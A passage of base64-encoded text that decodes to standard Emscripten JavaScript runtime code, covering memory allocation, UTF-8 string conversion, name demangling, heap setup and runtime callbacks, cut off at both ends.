EhFQVBGNjRbcHRyPj4zXTtkZWZhdWx0OmFib3J0KCJpbnZhbGlkIHR5cGUgZm9yIHNldFZhbHVlOiAiK3R5cGUpfQpyZXR1cm4gbnVsbH0KTW9kdWxlLmdldFZhbHVlPWdldFZhbHVlO3ZhciBBTExPQ19OT1JNQUw9MDt2YXIgQUxMT0NfU1RBQ0s9MTt2YXIgQUxMT0NfU1RBVElDPTI7dmFyIEFMTE9DX0RZTkFNSUM9Mzt2YXIgQUxMT0NfTk9ORT00O01vZHVsZS5BTExPQ19OT1JNQUw9QUxMT0NfTk9STUFMO01vZHVsZS5BTExPQ19TVEFDSz1BTExPQ19TVEFDSztNb2R1bGUuQUxMT0NfU1RBVElDPUFMTE9DX1NUQVRJQztNb2R1bGUuQUxMT0NfRFlOQU1JQz1BTExPQ19EWU5BTUlDO01vZHVsZS5BTExPQ19OT05FPUFMTE9DX05PTkU7ZnVuY3Rpb24gYWxsb2NhdGUoc2xhYix0eXBlcyxhbGxvY2F0b3IscHRyKXt2YXIgemVyb2luaXQsc2l6ZTtpZih0eXBlb2Ygc2xhYj09PSJudW1iZXIiKXt6ZXJvaW5pdD0hMDtzaXplPXNsYWJ9ZWxzZXt6ZXJvaW5pdD0hMTtzaXplPXNsYWIubGVuZ3RofQp2YXIgc2luZ2xlVHlwZT10eXBlb2YgdHlwZXM9PT0ic3RyaW5nIj90eXBlczpudWxsO3ZhciByZXQ7aWYoYWxsb2NhdG9yPT1BTExPQ19OT05FKXtyZXQ9cHRyfWVsc2V7cmV0PVt0eXBlb2YgX21hbGxvYz09PSJmdW5jdGlvbiI/X21hbGxvYzpSdW50aW1lLnN0YXRpY0FsbG9jLFJ1bnRpbWUuc3RhY2tBbGxvYyxSdW50aW1lLnN0YXRpY0FsbG9jLFJ1bnRpbWUuZHluYW1pY0FsbG9jXVthbGxvY2F0b3I9PT11bmRlZmluZWQ/QUxMT0NfU1RBVElDOmFsbG9jYXRvcl0oTWF0aC5tYXgoc2l6ZSxzaW5nbGVUeXBlPzE6dHlwZXMubGVuZ3RoKSl9CmlmKHplcm9pbml0KXt2YXIgcHRyPXJldCxzdG9wO2Fzc2VydCgocmV0JjMpPT0wKTtzdG9wPXJldCsoc2l6ZSZ+Myk7Zm9yKDtwdHI8c3RvcDtwdHIrPTQpe0hFQVAzMltwdHI+PjJdPTB9CnN0b3A9cmV0K3NpemU7d2hpbGUocHRyPHN0b3Ape0hFQVA4W3B0cisrPj4wXT0wfQpyZXR1cm4gcmV0fQppZihzaW5nbGVUeXBlPT09Imk4Iil7aWYoc2xhYi5zdWJhcnJheXx8c2xhYi5zbGljZSl7SEVBUFU4LnNldChzbGFiLHJldCl9ZWxzZXtIRUFQVTguc2V0KG5ldyBVaW50OEFycmF5KHNsYWIpLHJldCl9CnJldHVybiByZXR9CnZhciBpPTAsdHlwZSx0eXBlU2l6ZSxwcmV2aW91c1R5cGU7d2hpbGUoaTxzaXplKXt2YXIgY3Vycj1zbGFiW2ldO2lmKHR5cGVvZiBjdXJyPT09ImZ1bmN0aW9uIil7Y3Vycj1SdW50aW1lLmdldEZ1bmN0aW9uSW5kZXgoY3Vycil9CnR5cGU9c2luZ2xlVHlwZXx8dHlwZXNbaV07aWYodHlwZT09PTApe2krKztjb250aW51ZX0KaWYodHlwZT09Imk2NCIpdHlwZT0iaTMyIjtzZXRWYWx1ZShyZXQraSxjdXJyLHR5cGUpO2lmKHByZXZpb3VzVHlwZSE9PXR5cGUpe3R5cGVTaXplPVJ1bnRpbWUuZ2V0TmF0aXZlVHlwZVNpemUodHlwZSk7cHJldmlvdXNUeXBlPXR5cGV9CmkrPXR5cGVTaXplfQpyZXR1cm4gcmV0fQpNb2R1bGUuYWxsb2NhdGU9YWxsb2NhdGU7ZnVuY3Rpb24gZ2V0TWVtb3J5KHNpemUpe2lmKCFzdGF0aWNTZWFsZWQpcmV0dXJuIFJ1bnRpbWUuc3RhdGljQWxsb2Moc2l6ZSk7aWYoIXJ1bnRpbWVJbml0aWFsaXplZClyZXR1cm4gUnVudGltZS5keW5hbWljQWxsb2Moc2l6ZSk7cmV0dXJuIF9tYWxsb2Moc2l6ZSl9Ck1vZHVsZS5nZXRNZW1vcnk9Z2V0TWVtb3J5O2Z1bmN0aW9uIFBvaW50ZXJfc3RyaW5naWZ5KHB0cixsZW5ndGgpe2lmKGxlbmd0aD09PTB8fCFwdHIpcmV0dXJuIiI7dmFyIGhhc1V0Zj0wO3ZhciB0O3ZhciBpPTA7d2hpbGUoMSl7dD1IRUFQVThbcHRyK2k+PjBdO2hhc1V0Znw9dDtpZih0PT0wJiYhbGVuZ3RoKWJyZWFrO2krKztpZihsZW5ndGgmJmk9PWxlbmd0aClicmVha30KaWYoIWxlbmd0aClsZW5ndGg9aTt2YXIgcmV0PSIiO2lmKGhhc1V0ZjwxMjgpe3ZhciBNQVhfQ0hVTks9MTAyNDt2YXIgY3Vycjt3aGlsZShsZW5ndGg+MCl7Y3Vycj1TdHJpbmcuZnJvbUNoYXJDb2RlLmFwcGx5KFN0cmluZyxIRUFQVTguc3ViYXJyYXkocHRyLHB0citNYXRoLm1pbihsZW5ndGgsTUFYX0NIVU5LKSkpO3JldD1yZXQ/cmV0K2N1cnI6Y3VycjtwdHIrPU1BWF9DSFVOSztsZW5ndGgtPU1BWF9DSFVOS30KcmV0dXJuIHJldH0KcmV0dXJuIE1vZHVsZS5VVEY4VG9TdHJpbmcocHRyKX0KTW9kdWxlLlBvaW50ZXJfc3RyaW5naWZ5PVBvaW50ZXJfc3RyaW5naWZ5O2Z1bmN0aW9uIEFzY2lpVG9TdHJpbmcocHRyKXt2YXIgc3RyPSIiO3doaWxlKDEpe3ZhciBjaD1IRUFQOFtwdHIrKz4+MF07aWYoIWNoKXJldHVybiBzdHI7c3RyKz1TdHJpbmcuZnJvbUNoYXJDb2RlKGNoKX19Ck1vZHVsZS5Bc2NpaVRvU3RyaW5nPUFzY2lpVG9TdHJpbmc7ZnVuY3Rpb24gc3RyaW5nVG9Bc2NpaShzdHIsb3V0UHRyKXtyZXR1cm4gd3JpdGVBc2NpaVRvTWVtb3J5KHN0cixvdXRQdHIsITEpfQpNb2R1bGUuc3RyaW5nVG9Bc2NpaT1zdHJpbmdUb0FzY2lpO3ZhciBVVEY4RGVjb2Rlcj10eXBlb2YgVGV4dERlY29kZXIhPT0idW5kZWZpbmVkIj9uZXcgVGV4dERlY29kZXIoInV0ZjgiKTp1bmRlZmluZWQ7ZnVuY3Rpb24gVVRGOEFycmF5VG9TdHJpbmcodThBcnJheSxpZHgpe3ZhciBlbmRQdHI9aWR4O3doaWxlKHU4QXJyYXlbZW5kUHRyXSkrK2VuZFB0cjtpZihlbmRQdHItaWR4PjE2JiZ1OEFycmF5LnN1YmFycmF5JiZVVEY4RGVjb2Rlcil7cmV0dXJuIFVURjhEZWNvZGVyLmRlY29kZSh1OEFycmF5LnN1YmFycmF5KGlkeCxlbmRQdHIpKX1lbHNle3ZhciB1MCx1MSx1Mix1Myx1NCx1NTt2YXIgc3RyPSIiO3doaWxlKDEpe3UwPXU4QXJyYXlbaWR4KytdO2lmKCF1MClyZXR1cm4gc3RyO2lmKCEodTAmMTI4KSl7c3RyKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHUwKTtjb250aW51ZX0KdTE9dThBcnJheVtpZHgrK10mNjM7aWYoKHUwJjIyNCk9PTE5Mil7c3RyKz1TdHJpbmcuZnJvbUNoYXJDb2RlKCh1MCYzMSk8PDZ8dTEpO2NvbnRpbnVlfQp1Mj11OEFycmF5W2lkeCsrXSY2MztpZigodTAmMjQwKT09MjI0KXt1MD0odTAmMTUpPDwxMnx1MTw8Nnx1Mn1lbHNle3UzPXU4QXJyYXlbaWR4KytdJjYzO2lmKCh1MCYyNDgpPT0yNDApe3UwPSh1MCY3KTw8MTh8dTE8PDEyfHUyPDw2fHUzfWVsc2V7dTQ9dThBcnJheVtpZHgrK10mNjM7aWYoKHUwJjI1Mik9PTI0OCl7dTA9KHUwJjMpPDwyNHx1MTw8MTh8dTI8PDEyfHUzPDw2fHU0fWVsc2V7dTU9dThBcnJheVtpZHgrK10mNjM7dTA9KHUwJjEpPDwzMHx1MTw8MjR8dTI8PDE4fHUzPDwxMnx1NDw8Nnx1NX19fQppZih1MDw2NTUzNil7c3RyKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHUwKX1lbHNle3ZhciBjaD11MC02NTUzNjtzdHIrPVN0cmluZy5mcm9tQ2hhckNvZGUoNTUyOTZ8Y2g+PjEwLDU2MzIwfGNoJjEwMjMpfX19fQpNb2R1bGUuVVRGOEFycmF5VG9TdHJpbmc9VVRGOEFycmF5VG9TdHJpbmc7ZnVuY3Rpb24gVVRGOFRvU3RyaW5nKHB0cil7cmV0dXJuIFVURjhBcnJheVRvU3RyaW5nKEhFQVBVOCxwdHIpfQpNb2R1bGUuVVRGOFRvU3RyaW5nPVVURjhUb1N0cmluZztmdW5jdGlvbiBzdHJpbmdUb1VURjhBcnJheShzdHIsb3V0VThBcnJheSxvdXRJZHgsbWF4Qnl0ZXNUb1dyaXRlKXtpZighKG1heEJ5dGVzVG9Xcml0ZT4wKSlyZXR1cm4gMDt2YXIgc3RhcnRJZHg9b3V0SWR4O3ZhciBlbmRJZHg9b3V0SWR4K21heEJ5dGVzVG9Xcml0ZS0xO2Zvcih2YXIgaT0wO2k8c3RyLmxlbmd0aDsrK2kpe3ZhciB1PXN0ci5jaGFyQ29kZUF0KGkpO2lmKHU+PTU1Mjk2JiZ1PD01NzM0Myl1PTY1NTM2KygodSYxMDIzKTw8MTApfHN0ci5jaGFyQ29kZUF0KCsraSkmMTAyMztpZih1PD0xMjcpe2lmKG91dElkeD49ZW5kSWR4KWJyZWFrO291dFU4QXJyYXlbb3V0SWR4KytdPXV9ZWxzZSBpZih1PD0yMDQ3KXtpZihvdXRJZHgrMT49ZW5kSWR4KWJyZWFrO291dFU4QXJyYXlbb3V0SWR4KytdPTE5Mnx1Pj42O291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1JjYzfWVsc2UgaWYodTw9NjU1MzUpe2lmKG91dElkeCsyPj1lbmRJZHgpYnJlYWs7b3V0VThBcnJheVtvdXRJZHgrK109MjI0fHU+PjEyO291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1Pj42JjYzO291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1JjYzfWVsc2UgaWYodTw9MjA5NzE1MSl7aWYob3V0SWR4KzM+PWVuZElkeClicmVhaztvdXRVOEFycmF5W291dElkeCsrXT0yNDB8dT4+MTg7b3V0VThBcnJheVtvdXRJZHgrK109MTI4fHU+PjEyJjYzO291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1Pj42JjYzO291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1JjYzfWVsc2UgaWYodTw9NjcxMDg4NjMpe2lmKG91dElkeCs0Pj1lbmRJZHgpYnJlYWs7b3V0VThBcnJheVtvdXRJZHgrK109MjQ4fHU+PjI0O291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1Pj4xOCY2MztvdXRVOEFycmF5W291dElkeCsrXT0xMjh8dT4+MTImNjM7b3V0VThBcnJheVtvdXRJZHgrK109MTI4fHU+PjYmNjM7b3V0VThBcnJheVtvdXRJZHgrK109MTI4fHUmNjN9ZWxzZXtpZihvdXRJZHgrNT49ZW5kSWR4KWJyZWFrO291dFU4QXJyYXlbb3V0SWR4KytdPTI1Mnx1Pj4zMDtvdXRVOEFycmF5W291dElkeCsrXT0xMjh8dT4+MjQmNjM7b3V0VThBcnJheVtvdXRJZHgrK109MTI4fHU+PjE4JjYzO291dFU4QXJyYXlbb3V0SWR4KytdPTEyOHx1Pj4xMiY2MztvdXRVOEFycmF5W291dElkeCsrXT0xMjh8dT4+NiY2MztvdXRVOEFycmF5W291dElkeCsrXT0xMjh8dSY2M319Cm91dFU4QXJyYXlbb3V0SWR4XT0wO3JldHVybiBvdXRJZHgtc3RhcnRJZHh9Ck1vZHVsZS5zdHJpbmdUb1VURjhBcnJheT1zdHJpbmdUb1VURjhBcnJheTtmdW5jdGlvbiBzdHJpbmdUb1VURjgoc3RyLG91dFB0cixtYXhCeXRlc1RvV3JpdGUpe3JldHVybiBzdHJpbmdUb1VURjhBcnJheShzdHIsSEVBUFU4LG91dFB0cixtYXhCeXRlc1RvV3JpdGUpfQpNb2R1bGUuc3RyaW5nVG9VVEY4PXN0cmluZ1RvVVRGODtmdW5jdGlvbiBsZW5ndGhCeXRlc1VURjgoc3RyKXt2YXIgbGVuPTA7Zm9yKHZhciBpPTA7aTxzdHIubGVuZ3RoOysraSl7dmFyIHU9c3RyLmNoYXJDb2RlQXQoaSk7aWYodT49NTUyOTYmJnU8PTU3MzQzKXU9NjU1MzYrKCh1JjEwMjMpPDwxMCl8c3RyLmNoYXJDb2RlQXQoKytpKSYxMDIzO2lmKHU8PTEyNyl7KytsZW59ZWxzZSBpZih1PD0yMDQ3KXtsZW4rPTJ9ZWxzZSBpZih1PD02NTUzNSl7bGVuKz0zfWVsc2UgaWYodTw9MjA5NzE1MSl7bGVuKz00fWVsc2UgaWYodTw9NjcxMDg4NjMpe2xlbis9NX1lbHNle2xlbis9Nn19CnJldHVybiBsZW59Ck1vZHVsZS5sZW5ndGhCeXRlc1VURjg9bGVuZ3RoQnl0ZXNVVEY4O3ZhciBVVEYxNkRlY29kZXI9dHlwZW9mIFRleHREZWNvZGVyIT09InVuZGVmaW5lZCI/bmV3IFRleHREZWNvZGVyKCJ1dGYtMTZsZSIpOnVuZGVmaW5lZDtmdW5jdGlvbiBkZW1hbmdsZShmdW5jKXt2YXIgX19jeGFfZGVtYW5nbGVfZnVuYz1Nb2R1bGUuX19fY3hhX2RlbWFuZ2xlfHxNb2R1bGUuX19jeGFfZGVtYW5nbGU7aWYoX19jeGFfZGVtYW5nbGVfZnVuYyl7dHJ5e3ZhciBzPWZ1bmMuc3Vic3RyKDEpO3ZhciBsZW49bGVuZ3RoQnl0ZXNVVEY4KHMpKzE7dmFyIGJ1Zj1fbWFsbG9jKGxlbik7c3RyaW5nVG9VVEY4KHMsYnVmLGxlbik7dmFyIHN0YXR1cz1fbWFsbG9jKDQpO3ZhciByZXQ9X19jeGFfZGVtYW5nbGVfZnVuYyhidWYsMCwwLHN0YXR1cyk7aWYoZ2V0VmFsdWUoc3RhdHVzLCJpMzIiKT09PTAmJnJldCl7cmV0dXJuIFBvaW50ZXJfc3RyaW5naWZ5KHJldCl9fWNhdGNoKGUpe31maW5hbGx5e2lmKGJ1ZilfZnJlZShidWYpO2lmKHN0YXR1cylfZnJlZShzdGF0dXMpO2lmKHJldClfZnJlZShyZXQpfQpyZXR1cm4gZnVuY30KUnVudGltZS53YXJuT25jZSgid2FybmluZzogYnVpbGQgd2l0aCAtcyBERU1BTkdMRV9TVVBQT1JUPTEgdG8gbGluayBpbiBsaWJjeHhhYmkgZGVtYW5nbGluZyIpO3JldHVybiBmdW5jfQpmdW5jdGlvbiBkZW1hbmdsZUFsbCh0ZXh0KXt2YXIgcmVnZXg9L19fWltcXHdcXGRfXSsvZztyZXR1cm4gdGV4dC5yZXBsYWNlKHJlZ2V4LChmdW5jdGlvbih4KXt2YXIgeT1kZW1hbmdsZSh4KTtyZXR1cm4geD09PXk/eDp4KyIgWyIreSsiXSJ9KSl9CmZ1bmN0aW9uIGpzU3RhY2tUcmFjZSgpe3ZhciBlcnI9bmV3IEVycm9yO2lmKCFlcnIuc3RhY2spe3RyeXt0aHJvdyBuZXcgRXJyb3IoMCl9Y2F0Y2goZSl7ZXJyPWV9CmlmKCFlcnIuc3RhY2spe3JldHVybiIobm8gc3RhY2sgdHJhY2UgYXZhaWxhYmxlKSJ9fQpyZXR1cm4gZXJyLnN0YWNrLnRvU3RyaW5nKCl9CmZ1bmN0aW9uIHN0YWNrVHJhY2UoKXt2YXIganM9anNTdGFja1RyYWNlKCk7aWYoTW9kdWxlLmV4dHJhU3RhY2tUcmFjZSlqcys9IlxcbiIrTW9kdWxlLmV4dHJhU3RhY2tUcmFjZSgpO3JldHVybiBkZW1hbmdsZUFsbChqcyl9Ck1vZHVsZS5zdGFja1RyYWNlPXN0YWNrVHJhY2U7dmFyIFdBU01fUEFHRV9TSVpFPTY1NTM2O3ZhciBBU01KU19QQUdFX1NJWkU9MTY3NzcyMTY7ZnVuY3Rpb24gYWxpZ25VcCh4LG11bHRpcGxlKXtpZih4JW11bHRpcGxlPjApe3grPW11bHRpcGxlLXglbXVsdGlwbGV9CnJldHVybiB4fQp2YXIgSEVBUCxidWZmZXIsSEVBUDgsSEVBUFU4LEhFQVAxNixIRUFQVTE2LEhFQVAzMixIRUFQVTMyLEhFQVBGMzIsSEVBUEY2NDtmdW5jdGlvbiB1cGRhdGVHbG9iYWxCdWZmZXIoYnVmKXtNb2R1bGUuYnVmZmVyPWJ1ZmZlcj1idWZ9CmZ1bmN0aW9uIHVwZGF0ZUdsb2JhbEJ1ZmZlclZpZXdzKCl7TW9kdWxlLkhFQVA4PUhFQVA4PW5ldyBJbnQ4QXJyYXkoYnVmZmVyKTtNb2R1bGUuSEVBUDE2PUhFQVAxNj1uZXcgSW50MTZBcnJheShidWZmZXIpO01vZHVsZS5IRUFQMzI9SEVBUDMyPW5ldyBJbnQzMkFycmF5KGJ1ZmZlcik7TW9kdWxlLkhFQVBVOD1IRUFQVTg9bmV3IFVpbnQ4QXJyYXkoYnVmZmVyKTtNb2R1bGUuSEVBUFUxNj1IRUFQVTE2PW5ldyBVaW50MTZBcnJheShidWZmZXIpO01vZHVsZS5IRUFQVTMyPUhFQVBVMzI9bmV3IFVpbnQzMkFycmF5KGJ1ZmZlcik7TW9kdWxlLkhFQVBGMzI9SEVBUEYzMj1uZXcgRmxvYXQzMkFycmF5KGJ1ZmZlcik7TW9kdWxlLkhFQVBGNjQ9SEVBUEY2ND1uZXcgRmxvYXQ2NEFycmF5KGJ1ZmZlcil9CnZhciBTVEFUSUNfQkFTRSxTVEFUSUNUT1Asc3RhdGljU2VhbGVkO3ZhciBTVEFDS19CQVNFLFNUQUNLVE9QLFNUQUNLX01BWDt2YXIgRFlOQU1JQ19CQVNFLERZTkFNSUNUT1BfUFRSO1NUQVRJQ19CQVNFPVNUQVRJQ1RPUD1TVEFDS19CQVNFPVNUQUNLVE9QPVNUQUNLX01BWD1EWU5BTUlDX0JBU0U9RFlOQU1JQ1RPUF9QVFI9MDtzdGF0aWNTZWFsZWQ9ITE7ZnVuY3Rpb24gYWJvcnRPbkNhbm5vdEdyb3dNZW1vcnkoKXthYm9ydCgiQ2Fubm90IGVubGFyZ2UgbWVtb3J5IGFycmF5cy4gRWl0aGVyICgxKSBjb21waWxlIHdpdGggLXMgVE9UQUxfTUVNT1JZPVggd2l0aCBYIGhpZ2hlciB0aGFuIHRoZSBjdXJyZW50IHZhbHVlICIrVE9UQUxfTUVNT1JZKyIsICgyKSBjb21waWxlIHdpdGggLXMgQUxMT1dfTUVNT1JZX0dST1dUSD0xIHdoaWNoIGFsbG93cyBpbmNyZWFzaW5nIHRoZSBzaXplIGF0IHJ1bnRpbWUsIG9yICgzKSBpZiB5b3Ugd2FudCBtYWxsb2MgdG8gcmV0dXJuIE5VTEwgKDApIGluc3RlYWQgb2YgdGhpcyBhYm9ydCwgY29tcGlsZSB3aXRoIC1zIEFCT1JUSU5HX01BTExPQz0wICIpfQpmdW5jdGlvbiBlbmxhcmdlTWVtb3J5KCl7YWJvcnRPbkNhbm5vdEdyb3dNZW1vcnkoKX0KdmFyIFRPVEFMX1NUQUNLPU1vZHVsZS5UT1RBTF9TVEFDS3x8NTI0Mjg4MDt2YXIgVE9UQUxfTUVNT1JZPU1vZHVsZS5UT1RBTF9NRU1PUll8fDE2Nzc3MjE2O2lmKFRPVEFMX01FTU9SWTxUT1RBTF9TVEFDSylNb2R1bGUucHJpbnRFcnIoIlRPVEFMX01FTU9SWSBzaG91bGQgYmUgbGFyZ2VyIHRoYW4gVE9UQUxfU1RBQ0ssIHdhcyAiK1RPVEFMX01FTU9SWSsiISAoVE9UQUxfU1RBQ0s9IitUT1RBTF9TVEFDSysiKSIpO2lmKE1vZHVsZS5idWZmZXIpe2J1ZmZlcj1Nb2R1bGUuYnVmZmVyfWVsc2V7aWYodHlwZW9mIFdlYkFzc2VtYmx5PT09Im9iamVjdCImJnR5cGVvZiBXZWJBc3NlbWJseS5NZW1vcnk9PT0iZnVuY3Rpb24iKXtNb2R1bGUud2FzbU1lbW9yeT1uZXcgV2ViQXNzZW1ibHkuTWVtb3J5KHsiaW5pdGlhbCI6VE9UQUxfTUVNT1JZL1dBU01fUEFHRV9TSVpFLCJtYXhpbXVtIjpUT1RBTF9NRU1PUlkvV0FTTV9QQUdFX1NJWkV9KTtidWZmZXI9TW9kdWxlLndhc21NZW1vcnkuYnVmZmVyfWVsc2V7YnVmZmVyPW5ldyBBcnJheUJ1ZmZlcihUT1RBTF9NRU1PUlkpfX0KdXBkYXRlR2xvYmFsQnVmZmVyVmlld3MoKTtmdW5jdGlvbiBnZXRUb3RhbE1lbW9yeSgpe3JldHVybiBUT1RBTF9NRU1PUll9CkhFQVAzMlswXT0xNjY4NTA5MDI5O0hFQVAxNlsxXT0yNTQ1OTtpZihIRUFQVThbMl0hPT0xMTV8fEhFQVBVOFszXSE9PTk5KXRocm93ICJSdW50aW1lIGVycm9yOiBleHBlY3RlZCB0aGUgc3lzdGVtIHRvIGJlIGxpdHRsZS1lbmRpYW4hIjtNb2R1bGUuSEVBUD1IRUFQO01vZHVsZS5idWZmZXI9YnVmZmVyO01vZHVsZS5IRUFQOD1IRUFQODtNb2R1bGUuSEVBUDE2PUhFQVAxNjtNb2R1bGUuSEVBUDMyPUhFQVAzMjtNb2R1bGUuSEVBUFU4PUhFQVBVODtNb2R1bGUuSEVBUFUxNj1IRUFQVTE2O01vZHVsZS5IRUFQVTMyPUhFQVBVMzI7TW9kdWxlLkhFQVBGMzI9SEVBUEYzMjtNb2R1bGUuSEVBUEY2ND1IRUFQRjY0O2Z1bmN0aW9uIGNhbGxSdW50aW1lQ2FsbGJhY2tzKGNhbGxiYWNrcyl7d2hpbGUoY2FsbGJhY2tzLmxlbmd0aD4wKXt2YXIgY2FsbGJhY2s9Y2FsbGJhY2tzLnNoaWZ0KCk7aWYodHlwZW9mIGNhbGxiYWNrPT0iZnVuY3Rpb24iKXtjYWxsYmFjaygpO2NvbnRpbnVlfQp2YXIgZnVuYz1jYWxsYmFjay5mdW5jO2lmKHR5cGVvZiBmdW5jPT09Im51bWJlciIpe2lmKGNhbGxiYWNrLmFyZz09PXVuZGVmaW5lZCl7TW9kdWxlLmR5bkNhbGxfdihmdW5jKX1lbHNle01vZHVsZS5keW5DYWxsX3ZpKGZ1bmMsY2FsbGJhY2suYXJnKX19ZWxzZXtmdW5jKGNhbGxiYWNrLmFyZz09PXVuZGVmaW5lZD9udWxsOmNhbGxiYWNrLmFyZyl9fX0KdmFyIF9fQVRQUkVSVU5fXz1bXTt2YXIgX19BVElOSVRfXz1bXTt2YXIgX19BVE1BSU5fXz1bXTt2YXIgX19BVEVYSVRfXz1bXTt2YXIgX19BVFBPU1RSVU5fXz1bXTt2YXIgcnVudGltZUluaXRpYWxpemVkPSExO3ZhciBydW50aW1lRXhpdGVkPSExO2Z1bmN0aW9uIHByZVJ1bigpe2lmKE1vZHVsZS5wcmVSdW4pe2lmKHR5cGVvZiBNb2R1bGUucHJlUnVuPT0iZnVuY3Rpb24iKU1vZHVsZS5wcmVSdW49W01vZHVsZS5wcmVSdW5dO3doaWxlKE1vZHVsZS5wcmVSdW4ubGVuZ3RoKXthZGRPblByZVJ1bihNb2R1bGUucHJlUnVuLnNoaWZ0KCkpfX0KY2FsbFJ1bnRpbWVDYWxsYmFja3MoX19BVFBSRVJVTl9fKX0KZnVuY3Rpb24gZW5zdXJlSW5pdFJ1bnRpbWUoKXtpZihydW50aW1lSW5pdGlhbGl6ZWQpcmV0dXJuO3J1bnRpbWVJbml0aWFsaXplZD0hMDtjYWxsUnVudGltZUNhbGxiYWNrcyhfX0FUSU5JVF9fKX0KZnVuY3Rpb24gcHJlTWFpbigpe2NhbGxSdW50aW1lQ2FsbGJhY2tzKF9fQVRNQUlOX18pfQpmdW5jdGlvbiBleGl0UnVudGltZSgpe2NhbGxSdW50aW1lQ2FsbGJhY2tzKF9fQVRFWElUX18pO3J1bnRpbWVFeGl0ZWQ9ITB9CmZ1bmN0aW9uIHBvc3RSdW4oKXtpZihNb2R1bGUucG9zdFJ1bil7aWYodHlwZW9mIE1vZHVsZS5wb3N0UnVuPT0iZnVuY3Rpb24iKU1vZHVsZS5wb3N0UnVuPVtNb2R1bGUucG9zdFJ1bl07d2hpbGUoTW9kdWxlLnBvc3RSdW4ubGVuZ3RoKXthZGRPblBvc3RSdW4oTW9kdWxlLnBvc3RSdW4uc2hpZnQoKSl9fQpjYWxsUnVudGltZUNhbGxiYWNrcyhfX0FUUE9TVFJVTl9fKX0KZnVuY3Rpb24gYWRkT25QcmVSdW4oY2Ipe19fQVRQUkVSVU5fXy51bnNoaWZ0KGNiKX0KTW9kdWxlLmFkZE9uUHJlUnVuPWFkZE9uUHJlUnVuO2Z1bmN0aW9uIGFkZE9uSW5pdChjYil7X19BVElOSVRfXy51bnNoaWZ0KGNiKX0KTW9kdWxlLmFkZE9uSW5pdD1hZGRPbkluaXQ7ZnVuY3Rpb24gYWRkT25QcmVNYWluKGNiKXtfX0FUTUFJTl9fLnVuc2hpZnQoY2IpfQpNb2R1bGUuYWRkT25QcmVNYWluPWFkZE9uUHJlTWFpbjtmdW5jdGlvbiBhZGRPbkV4aXQoY2Ipe19fQVRFWElUX18udW5zaGlmdChjYil9Ck1vZHVsZS5hZGRPbkV4aXQ9YWRkT25FeGl0O2Z1bmN0aW9uIGFkZE9uUG9zdFJ1bihjYil7X19BVFBPU1RSVU5fXy51bnNoaWZ0KGNiKX0KTW9kdWxlLmFkZE9uUG9zdFJ1bj1hZGRPblBvc3RSdW47ZnVuY3Rpb24gaW50QXJyYXlGcm9tU3RyaW5nKHN0cmluZ3ksZG9udEFkZE51bGwsbGVuZ3RoKXt2YXIgbGVuPWxlbmd0aD4wP2xlbmd0aDpsZW5ndGhCeXRlc1VURjgoc3RyaW5neSkrMTt2YXIgdThhcnJheT1uZXcgQXJyYXkobGVuKTt2YXIgbnVtQnl0ZXNXcml0dGVuPXN0cmluZ1RvVVRGOEFycmF5KHN0cmluZ3ksdThhcnJheSwwLHU4YXJyYXkubGVuZ3RoKTtpZihkb250QWRkTnVsbCl1OGFycmF5Lmxlbmd0aD1udW1CeXRlc1dyaXR0ZW47cmV0dXJuIHU4YXJyYXl9Ck1vZHVsZS5pbnRBcnJheUZyb21TdHJpbmc9aW50QXJyYXlGcm9tU3RyaW5nO2Z1bmN0aW9uIGludEFycmF5VG9TdHJpbmcoYXJyYXkpe3ZhciByZXQ9W107Zm9yKHZhciBpPTA7aTxhcnJheS5sZW5ndGg7aSsrKXt2YXIgY2hyPWFycmF5W2ldO2lmKGNocj4yNTUpe2NociY9MjU1fQpyZXQucHVzaChTdHJpbmcuZnJvbUNoYXJDb2RlKGNocikpfQpyZXR1cm4gcmV0LmpvaW4oIiIpfQpNb2R1bGUuaW50QXJyYXlUb1N0cmluZz1pbnRBcnJheVRvU3RyaW5nO2Z1bmN0aW9uIHdyaXRlU3RyaW5nVG9NZW1vcnkoc3RyaW5nLGJ1ZmZlcixkb250QWRkTnVsbCl7UnVudGltZS53YXJuT25jZSgid3JpdGVTdHJpbmdUb01lbW9yeSBpcyBkZXByZWNhdGVkIGFuZCBzaG91bGQgbm90IGJlIGNhbGxlZCEgVXNlIHN0cmluZ1RvVVRGOCgpIGluc3RlYWQhIik7dmFyIGxhc3RDaGFyLGVuZDtpZihkb250QWRkTnVsbCl7ZW5kPWJ1ZmZlcitsZW5ndGhCeXRlc1VURjgoc3RyaW5nKTtsYXN0Q2hhcj1IRUFQOFtlbmRdfQpzdHJpbmdUb1VURjgoc3RyaW5nLGJ1ZmZlcixJbmZpbml0eSk7aWYoZG9udEFkZE51bGwpSEVBUDhbZW5kXT1sYXN0Q2hhcn0KTW9kdWxlLndyaXRlU3RyaW5nVG9NZW1vcnk9d3JpdGVTdHJpbmdUb01lbW9yeTtmdW5jdGlvbiB3cml0ZUFycmF5VG9NZW1vcnkoYXJyYXksYnVmZmVyKXtIRUFQOC5zZXQoYXJyYXksYnVmZmVyKX0KTW9kdWxlLndyaXRlQXJyYXlUb01lbW9yeT13cml0ZUFycmF5VG9NZW1vcnk7ZnVuY3Rpb24gd3JpdGVBc2NpaVRvTWVtb3J5KHN0cixidWZmZXIsZG9udEFkZE51bGwpe2Zvcih2YXIgaT0wO2k8c3RyLmxlbmd0aDsrK2kpe0hFQVA4W2J1ZmZlcisrPj4wXT1zdHIuY2hhckNvZGVBdChpKX0KaWYoIWRvbnRBZGROdWxsKUhFQVA4W2J1ZmZlcj4+MF09MH0KTW9kdWxlLndyaXRlQXNjaWlUb01lbW9yeT13cml0ZUFzY2lpVG9NZW1vcnk7aWYoIU1hdGguaW11bHx8TWF0aC5pbXVsKDQyOTQ5NjcyOTUsNSkhPT0tNSlNYXRoLmltdWw9ZnVuY3Rpb24gaW11bChhLGIpe3ZhciBhaD1hPj4+MTY7dmFyIGFsPWEmNjU1MzU7dmFyIGJoPWI+Pj4xNjt2YXIgYmw9YiY2NTUzNTtyZXR1cm4gYWwqYmwrKGFoKmJsK2FsKmJoPDwxNil8MH07TWF0aC5pbXVsPU1hdGguaW11bDtpZighTWF0aC5mcm91bmQpe3ZhciBmcm91bmRCdWZmZXI9bmV3IEZsb2F0MzJBcnJheSgxKTtNY